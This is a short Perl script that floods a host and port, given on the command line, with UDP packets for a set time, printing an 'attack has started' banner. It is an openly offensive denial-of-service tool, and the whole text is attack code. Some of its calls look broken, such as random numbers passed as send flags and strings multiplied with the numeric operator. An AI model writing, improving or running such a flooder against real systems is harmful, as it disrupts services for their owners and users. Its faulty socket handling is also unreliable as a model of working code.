$host = $ARGV[0];
$port = $ARGV[1];
$time = $ARGV[2];
$proto = 'UDP';
$endtime = time() + ($time ? $time : 1000000);
use IO::Socket;
use Scalar::Util qw(looks_like_number);


$sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
system("clear || cls");
print "\n[*] Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
sleep(1);
while (time() <= $endtime) {
  $size = rand() * 8921873 * 99919988;
  print("$endtime\n");
  #print("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
  send($sock, $size*2, $size*2); 
  send($sock, $size*3, $size*3);
  send($sock, $size*4, $size*4);
  send($sock, $size*9999999999999,$size*9999999999999);
  send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
}
$sock->close()
